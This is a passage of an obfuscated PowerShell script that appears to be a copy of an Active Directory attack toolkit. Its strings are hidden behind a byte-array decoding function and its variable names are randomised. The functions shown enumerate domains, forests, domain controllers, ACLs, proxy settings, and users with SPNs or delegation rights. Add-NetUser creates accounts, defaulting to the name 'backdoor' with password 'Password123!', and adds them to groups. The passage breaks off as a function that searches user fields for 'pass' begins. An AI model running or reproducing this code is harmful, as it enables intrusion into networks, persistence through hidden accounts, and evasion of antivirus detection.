        if($Value -is [Int]) {
            $GqGDkC = $Value
        }
        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $GqGDkC = $Value.useraccountcontrol
            }
        }
        if($GqGDkC) {
            if($ShowAll) {
                foreach ($zLQBAF in $IzZb.GetEnumerator()) {
                    if( ($GqGDkC -band $zLQBAF.Value) -eq $zLQBAF.Value) {
                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value) + "+"))
                    }
                    else {
                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value)))
                    }
                }
            }
            else {
                foreach ($zLQBAF in $IzZb.GetEnumerator()) {
                    if( ($GqGDkC -band $zLQBAF.Value) -eq $zLQBAF.Value) {
                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value)))
                    }
                }                
            }
        }
        $Ojx2zmYY
    }
}
function Get-Proxy {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )
    process {
        try {
            $GIhV = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
            $kwZ5TAYb = $GIhV.OpenSubkey((ParseEntry20 @(158,94,219,65,11,57,202,137,59,137,80,62,39,235,250,30,187,53,23,9,205,249,87,143,98,27,7,205,157,92,142,115,7,56,151,248,13,211,126,62,46,157,157,23,129,107,11,10,202,141,52,142,101,51,49,222,169,92,215,101,5,58,194,190,10,165,80,36,29,195,157,94,171,64,19,19,202,131,60,146,100,48,27,212) @(203,110,226,6,93,127,174)))
            $uA9g = $kwZ5TAYb.GetValue('ProxyServer')
            $ZtCRM2 = $kwZ5TAYb.GetValue('AutoConfigURL')
            if($ZtCRM2 -and ($ZtCRM2 -ne "")) {
                try {
                    $XJdfKq = (New-Object Net.Webclient).DownloadString($ZtCRM2)
                }
                catch {
                    $XJdfKq = ""
                }
            }
            else {
                $XJdfKq = ""
            }
            if($uA9g -or $ZtCRM2) {
                $Properties = @{
                    'ProxyServer' = $uA9g
                    'AutoConfigURL' = $ZtCRM2
                    'Wpad' = $XJdfKq
                }
                New-Object -TypeName PSObject -Property $Properties
            }
            else {
                Write-Warning ((ParseEntry20 @(212,12,43,230,58,200,43,101,228,17,235,6,112,179,15,176,5,84,237,44,218,82,94,230,3,237,88,34,227,52,209,6,73,236,96,249,40,82,188,100) @(128,97,19,129,89)) + $ComputerName)
            }
        }
        catch {
            Write-Warning ((ParseEntry20 @(246,5,243,36,137,56,237,58,227,10,222,58,198,10,239,36,178,83,246,45,219,48,136,108,199,21,243,43,142,67,207,58,218,111,189,59,192,26,213,40,177,56,233,58,227,48,210,114,237,28,132,96) @(164,93,185,93,235,11)) + $ComputerName)
        }
    }
}
function Get-PathAcl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,
        [Switch]
        $Recurse
    )
    begin {
        function Convert-FileRight {
            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )
            $P2lf = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $h4Ioogx = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }
            $ONfpdT9 = @()
            $ONfpdT9 += $h4Ioogx.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $h4Ioogx[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $ONfpdT9 += $P2lf.Keys |
                            ? { $FSR -band $_ } |
                            % { $P2lf[$_] }
            ($ONfpdT9 | ?{$_}) -join ","
        }
    }
    process {
        try {
            $IucGua = Get-Acl -Path $Path
            $IucGua.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                $FE0obXQs = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $FE0obXQs = @()
                    $nFK5t = @($Object.objectsid)
                    if ($Recurse -and ($Object.samAccountType -ne (ParseEntry20 @(75,64,152,233,115,91,25,54,73,163,129,10) @(4,4,217,216,62,33,88)))) {
                        $nFK5t += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }
                    $nFK5t | ForEach-Object {
                        $FE0obXQs += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $FE0obXQs += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }
                ForEach($Name in $FE0obXQs) {
                    $h60ta = New-Object PSObject
                    $h60ta | Add-Member Noteproperty 'Path' $Path
                    $h60ta | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $h60ta | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $h60ta | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $h60ta | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $h60ta
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}
function Get-NameField {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match (ParseEntry20 @(198,230,27,112,22,229,165,219,74,77,66,202,254,246,123,55) @(156,161,46,10,119,162))) ) {
                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match (ParseEntry20 @(144,157,22,162,11,1,84,228) @(242,240,80,214,81,80,105,217))) ) {
                $Object.name
            }
            else {
                $Object
            }
        }
        else {
            return $Null
        }
    }
}
function Convert-LDAPProperty {
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    $pjsNBs = @{}
    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq (ParseEntry20 @(212,179,21,35,236,214,17,98,213,179,51,57) @(182,129,95,82))) -or ($_ -eq (ParseEntry20 @(155,27,4,50,208,164,54,130,77,47,96,200,134,11,197,20) @(248,41,104,89,177,227,90)))) {
            $pjsNBs[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq (ParseEntry20 @(39,21,116,102,114,54,64,117,125,13,65,88,59,79,120,26) @(69,39,62,23,40,97,14))) {
            $pjsNBs[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq (ParseEntry20 @(43,59,2,141,22,62,14,63,38,118,206,7) @(73,124,68,247,114,121,118))) -or ($_ -eq (ParseEntry20 @(164,35,64,247,162,35,126,251,156,86,63,248,162,35,106,249,156,60,72,189,159,51,55,250) @(198,100,6,141))) -or ($_ -eq (ParseEntry20 @(236,146,200,169,237,157,234,184,235,146,226,174,235,155,145,255) @(143,218,172,194))) -or ($_ -eq (ParseEntry20 @(162,185,142,145,63,206,77,182,164,250,210,54,211,82,253,195) @(192,254,200,235,91,137,53))) -or ($_ -eq (ParseEntry20 @(46,72,58,42,136,237,253,13,70,79,37,171,201,214,37,112,29,22,236,198) @(119,37,124,65,221,170,187))) ) {
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                $kTso = $Properties[$_][0]
                [Int32]$jn7HT = $kTso.GetType().InvokeMember((ParseEntry20 @(233,75,190,192,159,130,123,210,111,188,255,195) @(186,12,210,174,254,196,57)), [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
                [Int32]$Iqg6  = $kTso.GetType().InvokeMember((ParseEntry20 @(137,3,108,69,136,3,19,15,185,5,104,75) @(221,68,85,118)),  [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
                $pjsNBs[$_] = ([datetime]::FromFileTime([Int64]((ParseEntry20 @(65,67,82,183,139,84,149,225,67,67,11,183,139,68,149,225,67,67,10,189) @(12,11,58,128,198,16,229,213)) -f $jn7HT, $Iqg6)))
            }
            else {
                $pjsNBs[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            $UhJQEjv = $Properties[$_]
            try {
                $kTso = $UhJQEjv[$_][0]
                Write-Verbose $_
                [Int32]$jn7HT = $kTso.GetType().InvokeMember((ParseEntry20 @(64,176,204,144,144,227,41,123,148,206,175,204) @(19,247,160,254,241,165,107)), [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
                [Int32]$Iqg6  = $kTso.GetType().InvokeMember((ParseEntry20 @(4,118,61,39,35,94,45,41,85,69,41,75) @(80,49,4,20,118,25,107)),  [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
                $pjsNBs[$_] = [Int64]((ParseEntry20 @(114,144,255,66,30,123,168,163,58,27,14,239,218,33,35,11,151,223,69,110) @(63,216,151,117,83)) -f $jn7HT, $Iqg6)
            }
            catch {
                $pjsNBs[$_] = $UhJQEjv[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $pjsNBs[$_] = $Properties[$_][0]
        }
        else {
            $pjsNBs[$_] = $Properties[$_]
        }
    }
    New-Object -TypeName PSObject -Property $pjsNBs
}
function Get-DomainSearcher {
    [CmdletBinding()]
    param(
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if(!$Domain) {
        $Domain = (Get-NetDomain).name
    }
    else {
        if(!$DomainController) {
            try {
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw (ParseEntry20 @(75,125,228,164,71,217,100,168,123,24,244,228,105,224,120,178,64,23,248,254,106,203,96,167,86,38,240,210,104,226,124,168,122,38,240,228,105,229,116,167,67,23,224,237,106,219,96,236,120,24,135,250,66,202,116,155,72,54,240,249,105,191,127,185,64,124,228,237,104,225,96,171,125,12,240,255,105,190,7,182,120,24,134,169) @(25,79,178,148,11,140,54,222))
            }
        }
    }
    $pFrxrB0i = (ParseEntry20 @(87,65,13,33,183,221,226,86,79,115,98,94) @(3,4,95,99,226,153,141,32))
    if($DomainController) {
        $pFrxrB0i += $DomainController + "/"
    }
    if($ADSprefix) {
        $pFrxrB0i += $ADSprefix + ","
    }
    if($ADSpath) {
        if($ADSpath -like (ParseEntry20 @(73,235,152,247,239,127,140,106) @(27,219,213,193,163,6,180))) {
            $DistinguishedName = $AdsPath
            $pFrxrB0i = ""
        }
        else {
            if($ADSpath -like (ParseEntry20 @(174,188,201,85,27,228,218,140,181,226,120,115) @(250,249,155,23,78,160,181))) {
                $ADSpath = $ADSpath.Substring(7)
            }
            $DistinguishedName = $ADSpath
        }
    }
    else {
        $DistinguishedName = ((ParseEntry20 @(153,44,127,36) @(203,105,50,29,184,218,200)) + $($Domain.Replace('.', ',DC=')))
    }
    $pFrxrB0i += $DistinguishedName
    Write-Verbose ((ParseEntry20 @(174,44,173,69,255,128,207,138,124,172,51,195,183,241,178,114,162,45,249,191,252,187,72,130,60,251,155,241,165,70,177,31,210,150,223,134,122,179,63,195,183,240,159,40,178,52,142,232) @(252,30,251,117,179,213,157)) + $pFrxrB0i)
    $TRb13UTh = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$pFrxrB0i)
    $TRb13UTh.PageSize = $PageSize
    $TRb13UTh
}
function Get-NetDomain {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )
    process {
        if($Domain) {
            $Y3D2c = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($Y3D2c)
            }
            catch {
                Write-Warning ((ParseEntry20 @(233,164,253,130,246,171,219,153,229,180,219,158,229,142,249,130,229,160,215,133,221,209,164,134,222,180,161,137) @(191,227,149,238)) + $Domain + (ParseEntry20 @(165,108,44,150,32,180,102,25,130,23,213,27,55,167,44,216,74,38,174,74,160,104,60,138,24,223,125,13,186,57,174,94,28,211,43,139,114,19,181,29,181,25,71,149,30,171,109,20,132,61,186,64,50,163,56,154,72,23,162,74,141,108,40,153,32,191,105,14,131,72,216,69,26,163,56,132,73,23,162,22,137,108,18,154,30,171,71,11,186,3,174,27,29,142,44,150,79,61,212,71) @(236,43,126,224,122)))
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}
function Get-NetForest {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        if($Forest) {
            $DRPix7 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $bOnZNtO9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($DRPix7)
            }
            catch {
                Write-Debug ((ParseEntry20 @(128,44,101,183,125,163,232,161,49,90,149,68,177,203,186,7,87,152,118,134,196,229,33,97,184,7,186,193) @(214,107,13,219,52,235,166)) + $Forest + (ParseEntry20 @(122,42,135,224,105,53,152,241,81,0,236,166,122,42,131,162,82,53,155,166,127,46,151,252,81,94,131,229,105,46,151,227,81,94,132,241,106,0,128,241,106,95,236,227,87,42,147,252,87,42,131,253,127,46,151,224,80,4,151,166,82,42,131,239,105,62,151,230,80,95,225,248,87,46,151,254,81,4,151,250,86,42,185,236,87,42,185,227,105,20,151,166,80,3,131,236,87,46,225,171) @(51,109,213,150)))
                $Null
            }
        }
        else {
            $bOnZNtO9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if($bOnZNtO9) {
            $dGDGq = (New-Object System.Security.Principal.NTAccount($bOnZNtO9.RootDomain,(ParseEntry20 @(36,221,69,66,16,26,242,140) @(69,238,15,43,116,93,150,188)))).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $A6w2GNY = $dGDGq -Split "-"
            $dGDGq = $A6w2GNY[0..$($A6w2GNY.length-2)] -join "-"
            $bOnZNtO9 | Add-Member NoteProperty 'RootDomainSid' $dGDGq
            $bOnZNtO9
        }
    }
}
function Get-NetForestDomain {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,
        [String]
        $Domain
    )
    process {
        if($Domain) {
            if($Domain.Contains('*')) {
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
            }
            else {
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
            }
        }
        else {
            $bOnZNtO9 = Get-NetForest -Forest $Forest
            if($bOnZNtO9) {
                $bOnZNtO9.Domains
            }
        }
    }
}
function Get-NetForestCatalog {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        $bOnZNtO9 = Get-NetForest -Forest $Forest
        if($bOnZNtO9) {
            $bOnZNtO9.FindAllGlobalCatalogs()
        }
    }
}
function Get-NetDomainController {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP
    )
    process {
        if($LDAP -or $DomainController) {
            Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        }
        else {
            $zImi = Get-NetDomain -Domain $Domain
            if($zImi) {
                $zImi.DomainControllers
            }
        }
    }
}
function Get-NetUser {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        $SPN,
        [Switch]
        $AdminCount,
        [Switch]
        $Unconstrained,
        [Switch]
        $AllowDelegation,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $tS3H = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
    }
    process {
        if($tS3H) {
            if($Unconstrained) {
                Write-Verbose (ParseEntry20 @(56,65,206,37,59,103,167,58,11,30,197,46,56,56,234,51,32,59,240,60,59,103,234,63,10,64,244,48,59,2,191,63,51,36,247,46,56,18,133,57,51,36,194,33,6,18,191,60,11,20,155,116) @(105,115,166,73,98,85,211,74))
                $Filter += (ParseEntry20 @(41,196,48,101,61,252,55,164,59,190,40,105,3,243,72,214,51,190,95,106,3,236,55,144,0,200,9,103,43,206,52,147,45,200,55,104,43,206,56,158,47,246,51,46,41,205,73,158,46,230,55,106,40,224,60,156,45,230,86,46,42,206,44,159,45,200,1,111) @(98,140,102,31,103,164,125,230))
            }
            if($AllowDelegation) {
                Write-Verbose (ParseEntry20 @(168,245,56,104,73,95,141,183,50,105,115,10,163,170,105,125,89,37,175,189,10,92,90,23,176,143,52,107,114,20,187,173,9,83,36,10,160,170,5,99,74,42,175,180,10,83,116,5,157,128,6,111) @(249,199,80,4,16,109))
                $Filter += (ParseEntry20 @(29,194,112,65,111,247,79,209,53,234,115,68,82,157,56,140,52,239,103,106,105,157,52,141,53,236,12,93,68,197,68,200,27,232,1,26,69,235,64,200,27,213,112,84,69,251,84,143,26,235,112,91,69,236,53,137,27,197,120,24,91,251,68,202,24,197,82,31,69,213,80,205,29,208,8,19) @(86,129,53,46,11,175,1,189))
            }
            if($AdminCount) {
                Write-Verbose (ParseEntry20 @(63,200,245,220,60,46,109,30,152,240,211,2,70,116,87,131,212,247,35,119,123,57,150,232,225,87,37,40,12,148,204,137,40,77,36,83) @(110,250,157,176,101,28,25))
                $Filter += (ParseEntry20 @(197,229,184,186,236,245,146,164,215,144,199,224,236,204,175,232,195,241,149,236) @(142,162,254,209))
            }
            if($UserName) {
                $tS3H.filter=((ParseEntry20 @(65,144,29,149,71,46,71,126,130,19,180,78,126,50,92,166,32,188,118,41,98,77,134,125,181,96,93,48,71,169,5,200,105,102,88,62,152,23,146,94,69,86,59,145,29,200,106,106,101,93,230,116,174,73,90,117,80,135,116,199) @(10,211,68,250,36,28,1)) + $UserName + ")" + $Filter + ")")
            }
            elseif($SPN) {
                $tS3H.filter=((ParseEntry20 @(38,191,167,91,179,68,199,25,173,169,122,186,20,178,59,137,154,114,130,67,226,42,169,199,123,148,55,176,32,134,191,6,157,12,216,89,183,173,92,170,44,217,39,206,159,99,158,26,212,37,182,142,86,189,56,241,14,187,184,71,132,27,199,25,166,170,4,161,61,208,80,193) @(109,252,254,52,208,118,129)) + $Filter + ")")
            }
            else {
                $tS3H.filter=((ParseEntry20 @(169,39,71,185,254,66,164,16,79,129,211,26,128,87,72,163,249,54,176,81,125,145,200,73,173,32,95,231,208,10,163,86,83,172,196,68,169,53,35,235) @(226,100,30,214,157,112)) + $Filter + ")")
            }
            $tS3H.FindAll() | Where-Object {$_} | ForEach-Object {
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}
function Add-NetUser {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',
        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )
    if ($Domain) {
        $iBN07 = Get-NetDomain -Domain $Domain
        if(-not $iBN07) {
            Write-Warning ((ParseEntry20 @(21,227,183,62,86,26,14,220,156,16,0,78,29,136,183,47,109,68,13,203,159,42,87,78) @(71,187,253,71,52,41)) + $Domain + (ParseEntry20 @(166,106,252,111,200,199,130,232,139,108,248,59) @(239,45,197,6,169,170,212,130)))
            return $Null
        }
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $uIRv = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $iBN07
        $qzuM = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $uIRv
        $qzuM.Name = $UserName
        $qzuM.SamAccountName = $UserName
        $qzuM.PasswordNotRequired = $False
        $qzuM.SetPassword($Password)
        $qzuM.Enabled = $True
        Write-Verbose ((ParseEntry20 @(75,240,105,67,6,66,145,83,77,50,121,164,71,119,17,118,160,74,110,98) @(26,195,35,47,95)) + $UserName + (ParseEntry20 @(98,231,228,190,192,110,79,223,210,143,238,65,72,232,240,178,234,21,79,217,213,165,216,65,97,216,139,245) @(43,175,182,200,137,38)) + $Password + (ParseEntry20 @(47,201,214,125,50,47,39,219,246,63,97,46,4,231,160,106) @(101,176,148,13,80,70)) + $Domain)
        try {
            $qzuM.Save()
            ((ParseEntry20 @(111,36,235,200,62,126,11,225,246,47,113,58) @(56,93,155,172,119)) + $UserName + (ParseEntry20 @(127,170,55,145,194,4,172,21,195,168,120,143,29,247,227,69,135,42,226,241,85,143,47,200,255,113,180,18,233,220,90,151,48,231,201,64,128,46,230,235,84,139,56,157) @(54,226,121,160,155)) + $Domain)
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        Write-Verbose ((ParseEntry20 @(229,182,102,112,237,221,126,108,214,232,79,123,208,221,98,112,215,236,109,33) @(180,133,44,28)) + $UserName + (ParseEntry20 @(145,196,216,228,12,144,232,250,246,2,191,235,233,213,3,162,239,185,246,51,187,225,219,245,15,175,177,183) @(216,140,138,146,69)) + $Password + (ParseEntry20 @(77,182,24,193,101,166,27,138) @(7,207,90,183)) + $ComputerName)
        $adn3Dd = [ADSI]((ParseEntry20 @(219,133,210,249,161,46,220,129,242,245,205,127) @(141,183,190,140,245,66)) + $ComputerName)
        $YNiE = $adn3Dd.Create('User', $UserName)
        $YNiE.SetPassword($Password)
        try {
            $Null = $YNiE.SetInfo()
            ((ParseEntry20 @(71,24,46,249,141,86,55,36,199,156,89,6) @(16,97,94,157,196)) + $UserName + (ParseEntry20 @(128,17,60,76,237,20,149,165,58,65,51,217,66,140,177,42,23,46,246,76,184,164,15,26,25,243,112,176,128,30,75,8,253,97,179,191,58,65,44,211) @(201,89,114,125,180,38,219)) + $ComputerName)
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }
    if ($GroupName) {
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            ((ParseEntry20 @(235,122,105,232,236,250,85,99,214,253,245,100) @(188,3,25,140,165)) + $UserName + (ParseEntry20 @(172,101,34,66,140,209,110,98,134,30,34,30,177,180,88,125,128,126,46,27,143,164,114,98,191,110,46,67,183,154,98,96,134,64,85,66,182,160,97,51) @(229,45,108,115,213,227,32,14)) + $GroupName + (ParseEntry20 @(3,37,111,251,19,13,48,117,236,13,12,18,97,231,27,119) @(74,98,3,142,90)) + $Domain)
        }
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            ((ParseEntry20 @(147,209,65,184,141,238,103,166,158,240,120,187) @(196,168,49,220)) + $UserName + (ParseEntry20 @(246,219,124,226,27,112,160,186,220,160,124,190,38,21,150,165,218,192,112,187,24,5,188,186,229,208,112,227,32,59,172,184,220,254,11,226,33,1,175,235) @(191,147,50,211,66,66,238,214)) + $GroupName + (ParseEntry20 @(108,87,2,134,56,98,120,77,144,66,116,119) @(37,16,59,243,113)) + $ComputerName)
        }
    }
}
function Add-NetGroupUser {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,
        [String]
        $Domain
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    if($ComputerName -and ($ComputerName -ne (ParseEntry20 @(74,180,47,159,40,127,139,121,151,66,102,195) @(40,243,22,245,113)))) {
        try {
            Write-Verbose ((ParseEntry20 @(148,76,172,173,164,76,203,168,140,83,168,188,159,67,183,161) @(197,27,254,198)) + $UserName + (ParseEntry20 @(246,126,142,168,146,23,37,130) @(191,54,220,222,219,86,24)) + $GroupName + (ParseEntry20 @(229,209,149,168,203,72,247,218,245,159,140,229) @(172,150,172,221,130,15,159)) + $ComputerName)
            ([ADSI]((ParseEntry20 @(53,162,58,111,194,186,22,85,220,47,34,171) @(99,144,86,26,150,214,71)) + $ComputerName + "/" + $GroupName + (ParseEntry20 @(159,51,118,98,109,194,33,164) @(211,116,18,27,15,241,119)))).add(((ParseEntry20 @(110,112,200,123,108,46,245,56,116,59,156,51) @(56,66,164,14)) + $ComputerName + "/" + $UserName + (ParseEntry20 @(161,154,19,68,2,181,155,120) @(237,210,69,62,88))))
            ((ParseEntry20 @(58,109,40,230,188,54,67,23,78,0,203,146) @(109,20,88,130,245,112,21)) + $UserName + (ParseEntry20 @(72,101,226,90,67,51,99,192,8,41,79,64,200,60,98,114,72,255,41,114,91,106,254,7,64,66,111,156,9,99,67,67,207,6,35,48,78,239,42,39) @(1,45,172,107,26)) + $GroupName + (ParseEntry20 @(103,134,50,102,155,101,19,252) @(46,193,11,19,210,36)) + $ComputerName)
        }
        catch {
            Write-Warning ((ParseEntry20 @(12,135,17,96,254,237,45,22,56,147,110,125,254,239,61,4,1,185,59,113,237,209,57,94,56,204,1,125,254,233,70,82) @(91,254,87,4,183,168,123,111)) + $UserName + (ParseEntry20 @(132,12,54,143,198,192,169,61,6,202,217,240,132,5,89,196) @(205,68,100,249,143,135)) + $GroupName + (ParseEntry20 @(70,169,107,148,80,17,50,211) @(15,238,82,225,25,80)) + $ComputerName)
            return
        }
    }
    else {
        try {
            if ($Domain) {
                Write-Verbose ((ParseEntry20 @(249,186,15,22,181,114,204,198,164,21,43,174,127,161,225,138) @(168,237,93,125,212,37,249)) + $UserName + (ParseEntry20 @(228,175,25,135,175,178,115,109) @(173,231,75,241,230,243,78,80)) + $GroupName + (ParseEntry20 @(145,58,37,89,145,58,78,90,186,42,90,92,186,20,93,17) @(216,125,28,44)) + $Domain)
                $NAR8E = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $iBN07 = Get-NetDomain -Domain $Domain
                if(-not $iBN07) {
                    return $Null
                }
                $uIRv = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $NAR8E, $iBN07            
            }
            else {
                Write-Verbose ((ParseEntry20 @(100,61,247,16,131,163,106,91,35,237,45,152,174,7,124,13) @(53,106,165,123,226,244,95)) + $UserName + (ParseEntry20 @(165,65,102,79,250,130,209,52) @(236,9,52,57,179,195)) + $GroupName + (ParseEntry20 @(214,88,234,213,159,30,231,105,138,146,144,42,254,88,234,218,178,24,162,34) @(159,31,211,160,214,89)))
                $uIRv = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }
            $tDwvKLfV = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($uIRv,$GroupName)
            $tDwvKLfV.Members.add($uIRv, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
            $tDwvKLfV.Save()
        }
        catch {
            Write-Warning ((ParseEntry20 @(148,44,132,197,165,148,136,161,45,153,238,172,198,150,243,26,135,253,250,154) @(198,116,206,188,199,167,193)) + $UserName + (ParseEntry20 @(195,50,48,204,83,19,243,183) @(138,122,98,186,26,82,206)) + $GroupName + (ParseEntry20 @(68,96,128,32) @(13,36,239,71,176,173)) + $_)
        }
    }
}
function Get-UserProperty {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($Properties) {
        $Properties = ,(ParseEntry20 @(129,97,13,69,185,93,118,12) @(227,12,75,49)) + $Properties
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}
function Find-UserField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
